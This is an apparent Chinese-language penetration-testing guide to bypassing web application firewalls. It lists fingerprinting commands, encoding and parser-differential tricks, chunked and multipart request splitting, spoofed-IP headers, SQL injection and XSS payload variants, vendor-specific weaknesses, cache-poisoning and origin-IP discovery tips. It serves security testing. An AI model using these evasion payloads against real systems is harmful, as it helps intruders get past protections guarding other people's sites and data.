---

phase: webapp
vuln_class: [waf]
title: WAF 绕过测试
summary: WAF 绕过：先确认「是 WAF 还是限速还是应用自己拒的」，再按防护面选编码/协议/解析器差分/源站直连。
---

# WAF 绕过

## 0. 判据速查

撞墙了先看回什么，别直接开始试编码。

| 现象 | 说明 | 去哪节 |
|---|---|---|
| 403 + 自定义拦截页（有厂商 logo / 支持 ID / rule id） | 真 WAF，且**回显了产品指纹** | §2 指纹 |
| 403 但页面是应用的错误模板 | 应用自己拒的，可能根本没 WAF | §2.2 |
| 200，但响应里 payload 被**静默剥离/转义** | 最坑：WAF 不拦，只做净化 | §6 坑 1 |
| 429 / 连接被重置 / 延迟突然变大 | 限速或行为风控，**不是 payload 拦截** | §6 坑 3 |
| 只有某些参数、某些路径被拦 | 规则是**按参数/按 URI 配的**，找没覆盖的那条 | §5 |
| 大 body 不拦，小 body 拦 | 撞到**检查长度上限**，这是最稳定的绕过面 | §5.2 |
| 换 Content-Type 就不拦 | WAF 只解析特定格式 | §3.7 |
| 能直连源站 IP | 绕过结束，不用打了 | §5.6 |

---

## 1. 先摸清防护面

不知道对面是什么，试编码是碰运气。

### 1.1 主动探测

```bash
wafw00f https://target.com          # 厂商指纹
nmap --script=http-waf-detect -p443 target.com
```

### 1.2 行为指纹（更可靠）

```
1. 发正常请求，记基线：状态码 / 响应头 / body 长度 / 耗时
2. 发明显攻击：/?q=<script>alert(1)</script>
3. 比对：403？自定义拦截页？302？连接被 reset？还是 200 但内容变了？
4. 拦截页文案直接暴露厂商："Cloudflare" / "Access Denied (Imperva)" / "ModSecurity"
5. 透明代理模式下看不到拦截页 → 只能靠响应时间差（WAF 会加延迟）
```

### 1.3 头指纹

`Server`、`X-CDN`、`X-Cache`、`cf-ray`（Cloudflare）、`x-sucuri-id`、`x-akamai-*`、`x-amzn-requestid`、`BIGipServer*` cookie、`incap_ses_*` / `visid_incap_*` cookie。

---

## 2. 通用绕过面

按「WAF 和应用的**解析器差分**在哪」分类，不是按 payload 分类。

### 2.1 编码层差分

WAF 解码次数 ≠ 应用解码次数，这个差值就是绕过面。

| 手法 | 例子 | 利用的差分 |
|---|---|---|
| URL 编码 | `%3Cscript%3E` | 只挡明文的规则 |
| 双重编码 | `%253Cscript%253E` | WAF 解一次、应用解两次 |
| `%u` 编码 | `%u003Cscript%u003E` | IIS 特有的 Unicode 归一化 |
| HTML 实体 | `&#60;script&#62;` / `&#x3c;` | WAF 不做实体解码 |
| SQL 十六进制 | `0x756E696F6E` = `union` | 匹配关键字而非语义 |
| 八进制 | `\74script\76` | 少见，个别解析器吃 |
| 超长 UTF-8 | `%C0%BC`（`<` 的非法编码） | 宽松 UTF-8 解析的遗留组件 |
| 大小写混写 | `SeLeCt` / `uNiOn` | 大小写敏感的规则 |
| 空字节 | `sel%00ect` | 解析到 null 就停的 WAF |

**判据**：先确定应用侧最终怎么解码（框架/语言），再看 WAF 是不是同一套解码器。解码器不一致才有得打。

### 2.2 分块传输（chunked）

把 payload 拆到多个 chunk，任何单个 chunk 都不含被拦的模式：

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

3
sel
3
ect
1
 
4
from
0

```

前提：WAF **不重组 chunk** 就做匹配。如果 WAF 先拼再查，无效。

### 2.3 HTTP/2 二进制帧

HPACK 编码的头，部分 WAF 只在降级到 HTTP/1.1 后才检查：

- 头名可含 HTTP/1.1 非法字符
- 伪头（`:method`、`:path`）绕过基于 header 的规则
- H2 → H1 降级本身可能引入请求走私（见 [HTTP请求走私](../HTTP请求走私/HTTP 请求走私测试.md)）

### 2.4 参数污染（HPP）

同名参数不同服务端取法不同：

| 服务端 | `?a=1&a=2` |
|---|---|
| PHP / Apache | 取最后一个 `a=2` |
| ASP.NET / IIS | 拼接成 `a=1,2` |
| Python / Flask | 取第一个 `a=1` |
| Node.js / Express | 变数组 `a=[1,2]` |

WAF 查 `a=1`（干净），应用用 `a=2`（恶意）。或者反向利用拼接：`a=sel&a=ect` → ASP.NET 得到 `sel,ect`。

### 2.5 伪造来源 IP（打基于 IP 的规则）

WAF 白名单内网 IP、或按来源分规则集时有效：

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

### 2.6 路径归一化差分

| 手法 | 例子 | 差分点 |
|---|---|---|
| 点段 | `/./admin`、`/../target/admin` | WAF 和应用归一化结果不同 |
| 双斜杠 | `//admin` | 有的归一化器折叠，WAF 不折 |
| 路径编码 | `/%61dmin` | WAF 看到编码，应用解出 `admin` |
| 空字节 | `/admin%00.jpg` | 应用截断到 null，WAF 看到 `.jpg` |
| 反斜杠（IIS） | `/admin\..\/secret` | IIS 把 `\` 当 `/` |
| 尾点/尾空格 | `/admin.`、`/admin%20` | Windows 层归一化 |
| 分号（Tomcat） | `/admin;jsessionid=x` | Tomcat 剥掉 `;` 之后，WAF 不剥 |

### 2.7 Content-Type 切换

WAF 按格式选解析器，切到它不解析的那个：

```
默认：application/x-www-form-urlencoded  → WAF 解析参数
切：  application/json                   → WAF 可能不解析 JSON body
切：  multipart/form-data                → WAF 可能不查所有 part
切：  text/xml                           → 规则集整套不一样
```

**优先试 JSON**：应用若同时接受 JSON 和表单，JSON 侧的 WAF 规则通常更弱。

### 2.8 multipart 边界滥用

```http
Content-Type: multipart/form-data; boundary=----WAFBypass

------WAFBypass
Content-Disposition: form-data; name="q"

<script>alert(1)</script>
------WAFBypass--
```

变体：超长 boundary、boundary 含特殊字符、**缺结尾 boundary**、嵌套 multipart。目标都是让 WAF 的 multipart 解析器和应用的对不上。

### 2.9 空白符与注释切分

```sql
-- 换行切断关键字
SEL
ECT * FROM users

-- 注释插入
SEL/**/ECT * FR/**/OM users
UN/**/ION SEL/**/ECT 1,2,3

-- 制表符/垂直制表符当分隔
SELECT\t*\tFROM\tusers
```

### 2.10 等价语法替换

| 被拦 | 替换 |
|---|---|
| `UNION SELECT` | `UNION ALL SELECT`、`UNION DISTINCT SELECT` |
| `OR 1=1` | `OR 2>1`、`OR 'a'='a'`、`\|\|1` |
| `<script>` | `<svg/onload=alert(1)>`、`<img src=x onerror=alert(1)>` |
| `alert(1)` | `prompt(1)`、`confirm(1)`、`print()`（Chrome） |
| `eval()` | `Function('code')()`、`setTimeout('code',0)` |
| `' OR '1'='1` | `' OR 1-- -`、`'\|\|'1` |
| `SLEEP(5)` | `BENCHMARK(5000000,SHA1('x'))`、`pg_sleep(5)` |

---

## 3. 协议层

### 3.1 请求行用绝对 URI

```http
GET /path?q=attack HTTP/1.1              ← WAF 检查这里
GET http://target.com/path?q=attack HTTP/1.1   ← 部分 WAF 取不到 path
```

### 3.2 CRLF 注入头

WAF 检查原始头，应用处理注入出来的头：

```
X-Custom: value\r\nX-Forwarded-For: 127.0.0.1
```

### 3.3 连接复用降检查

```
1. 先走正常请求建立 keep-alive 连接
2. 在同一条连接上发攻击请求
3. 部分 WAF 对同连接后续请求的检查强度下降
```

---

## 4. 按产品看弱点

| WAF | 主绕过面 | 检查长度上限 | 核心弱点 |
|---|---|---|---|
| Cloudflare | Unicode 归一化 + 源站 IP | 128KB | 全角字符、免费版规则少 |
| AWS WAF | body > 8KB | 8KB（CloudFront 16KB） | 长度上限、正则超时 |
| ModSecurity CRS | PL1 规则稀疏 + MySQL 注释 | 可配 | 默认偏执等级低 |
| Akamai | 编码链 + 慢速 POST | 不定 | 自适应引擎有学习延迟 |
| Imperva | HPP + JSON 深嵌套 | 未知 | 参数污染 |
| F5 BIG-IP ASM | 序列化数据 + 学习模式 | 可配 | 序列化检查弱 |
| Sucuri | 源站 IP + 冷门标签 | 未知 | 规则偏 WordPress |

### 4.1 Cloudflare

- 指纹：`cf-ray`、`Server: cloudflare`、`__cfduid` / `__cf_bm` cookie
- 全角字符（`＜script＞`）CF 归一化结果和后端不一致
- chunked 拆包，CF 可能不重组
- SQLi：`/*!50000UniOn*/SeLeCt`（MySQL 版本注释）
- XSS：`<svg/onload=alert&#40;1&#41;>`、`<details open ontoggle=alert(1)>`
- 参数名 >128 字符可能让 CF 跳过检查
- **注意**：「Managed Rules」和「OWASP CRS」是两套规则，绕过面不同；免费版规则数远少于企业版
- Browser Integrity Check / Bot Management 是独立模块，别和 WAF 混为一谈

### 4.2 AWS WAF

- 指纹：`x-amzn-requestid`，挂在 ALB / CloudFront / API Gateway 前
- 只检查 body 前 8KB（CloudFront 16KB），**超出部分不检查** —— 若配的是「超限放行」，直接 pad 过去
- 正则规则有执行时间上限，复杂输入可让它超时 → 请求放行
- 不在参数值里自动解 Base64（除非配了自定义 transform）
- 默认托管规则漏很多边界；自定义规则常写错逻辑
- 深嵌套 JSON 可能超解析器深度

### 4.3 ModSecurity + OWASP CRS

- 指纹：拦截页提 ModSecurity，或错误里有 `id:942100` 这类 rule id
- **偏执等级（PL）**：PL1 规则最少，多数部署跑 PL1–PL2
- 拿到拦截的 rule id 后，针对那条正则做定向构造，比盲试高效
- `/*! ... */` MySQL 条件注释绕过大量 CRS SQLi 规则
- PL1 不查 `%u0027` 这类 Unicode 编码
- 转换顺序：CRS 用 `t:urlDecodeUni,t:htmlEntityDecode`，但**不是所有规则都套全转换**
- `SecRequestBodyLimit` 默认 13MB，但 `SecRequestBodyNoFilesLimit` 只有 128KB —— 文件上传字段里的 payload 可能只受后者约束
- **异常评分模式**：单条违规只加分，总分超阈值才拦。可以让每条都低于检测阈值，靠累加触发副作用（这条对打点意义有限，对刷接口有用）
- 配置里的 `SecRuleRemoveById` 可能关掉了某些规则 → 找这些洞

### 4.4 Akamai

- 指纹：`Server: AkamaiGHost`、`x-akamai-*`、拦截页带错误参考号
- `X-Forwarded-Host` 注入可干扰路由
- 三重编码 / 混合编码（URL + Unicode + HTML）
- JSON 深嵌套对象可能不被深入检查
- 慢速 POST：超时保护导致检查不完整
- H2 server push 响应可能不过 WAF
- **Penalty box**：触发后 IP 被限速数分钟，每次测试换新 IP
- `Pragma: akamai-x-check-cacheable` 可泄露内部路由信息
- Adaptive Security Engine 有学习期，新攻击模式初期可能不匹配

### 4.5 Imperva / Incapsula

- 指纹：`X-CDN: Imperva`、`incap_ses_*` / `visid_incap_*` cookie
- 重复参数：Imperva 看一个，应用用另一个
- JSON 深嵌套超解析深度
- 畸形 multipart boundary
- body 开头塞 UTF-8 BOM（`\xEF\xBB\xBF`）可错开解析对齐
- 超长 Cookie 头导致检查被截断
- **WebSocket 升级后**的流量可能不再过 WAF
- Client Classification 做浏览器指纹，无头浏览器可能在 WAF 规则之前就被挡 —— 用真实浏览器指纹
- API 安全模块和 Web WAF 是两套，API 端点防护通常更弱

### 4.6 F5 BIG-IP ASM

- 指纹：`Server: BigIP`、`BIGipServer` cookie、`TS` cookie 前缀，拦截页带 support ID
- 对序列化数据（Java / PHP / .NET）检查弱
- JSON 和 XML 走不同规则集
- 「元字符强制」用双重编码可绕
- `TS` cookie 被篡改会让 ASM 当成新会话（影响规则应用，也可能直接放行）
- **学习模式**（transparent）下不拦 —— 先用明显恶意 payload 试一次确认
- 区分「attack signatures」（模式匹配）和「violations」（结构违规：参数长度、类型），**两者都要过**

### 4.7 Sucuri

- 指纹：`Server: Sucuri/Cloudproxy`、`X-Sucuri-ID`
- 冷门标签组合：`<svg/onload>`、`<details/ontoggle>`、`<marquee onstart>`
- SQL 函数替代：`MID()` 换 `SUBSTRING()`、`CONV()` 做进制转换
- 路径穿越：`..%252f..%252f`（双重编码）
- 反代架构，**源站 IP 一找到就完全绕过**
- GET / POST / PUT 规则可能不同
- 参数值里 `%00` 可截断其检查
- 常见于 WordPress，配合 WP 专属攻击面
- 免费版规则明显弱于付费版

---

## 5. 常见误判与坑

1. **200 不等于绕过成功**：WAF 可能返回 200 但把 payload 静默剥离或转义。必须验证**副作用是否真的发生**（回显、带外、数据变化），不能只看状态码。
2. **大小上限是最稳的绕过面**：多数 WAF 只查前 8KB–128KB。超限配置若是「放行」，把 payload 垫到边界之后即可。这个不用猜编码，先试。
3. **429 是限速不是拦截**：限速要换 IP / 降速，编码绕过对它无效。先分清是哪种，否则方向全错。
4. **CDN 缓存绕过**：WAF 挂在 CDN 层时，命中缓存的响应不再过 WAF。先用干净请求把恶意响应**投毒进缓存**，再取。
5. **源站直连是终局**：找到 CDN 后的源站 IP（DNS 历史、Shodan `ssl.cert.subject.cn:target.com`、邮件头、证书透明日志），直接连源站，WAF 完全不存在。**先花时间找源站，比试一百个编码值**。
6. **文件上传字段常被跳过**：multipart 里的文件内容 WAF 往往不查。payload 藏在文件名或文件内容里，只要它会被回显/解析。
7. **别在没确认 WAF 存在时试绕过**：应用自己返回的 403（权限不足、路径不存在）和 WAF 拦截是两件事。先做 §1.2 的基线对比。

---

## 6. 纪律

- **先分诊再动手**：是 WAF 拦截、是限速、还是应用自己拒的。判错方向会浪费大量时间。
- **绕过必须用真实利用验证**：`200` 只是必要条件。判据是「攻击效果发生了」。
- **优先找结构性绕过**：源站 IP、检查长度上限、格式解析器缺口 —— 这三类不依赖具体 payload，一次成功长期有效。编码变形是最后手段，因为规则更新就失效。
- **报漏洞时不报「绕过了 WAF」**：WAF 绕过是手段不是成果。成果是绕过之后拿到的注入点/文件读取/RCE。报告里写清「WAF 是什么、用什么手法绕的、绕过之后利用到了什么」。
- **别把 WAF 当成不可逾越**：WAF 是缓解层不是修复。但反过来，如果目标只有 WAF 没有代码修复，说明漏洞真实存在，绕过即证明。
